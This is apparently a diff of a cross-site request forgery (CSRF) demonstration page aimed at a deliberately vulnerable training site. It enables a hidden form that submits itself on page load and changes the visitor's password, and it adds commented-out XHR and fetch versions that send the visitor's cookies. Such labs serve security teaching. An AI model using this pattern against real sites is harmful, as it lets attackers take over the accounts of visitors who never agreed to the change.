@@ -9,7 +9,7 @@
       id="malicious-form"
       action="https://hack-yourself-first.com/Account/ChangePassword"
       method="post"
-      style="display: none;"
+      style="display: none"
     >
       <input
         id="NewPassword"
@@ -28,7 +28,32 @@
     </form>
 
     <script>
-        //document.getElementById("malicious-form").submit();
+      document.getElementById("malicious-form").submit();
+
+      /* AJAX Request
+
+          var formData = new FormData();
+          formData.append("NewPassword", "hacked");
+          formData.append("ConfirmPassword", hacked);
+          var request = new XMLHttpRequest();
+          request.open("POST", "https://hack-yourself-first.com/Account/ChangePassword");
+          request.send(formData);
+
+        */
+
+      /* Fetch Api
+
+          var formData = new FormData();
+          formData.append("NewPassword", "hacked");
+          formData.append("ConfirmPassword", hacked);
+          fetch('https://hack-yourself-first.com/Account/ChangePassword', {
+            method: 'POST',
+            credentials: "include",
+            body: formData
+          })
+          .then(response => response.json())
+
+        */
     </script>
   </body>
 </html>
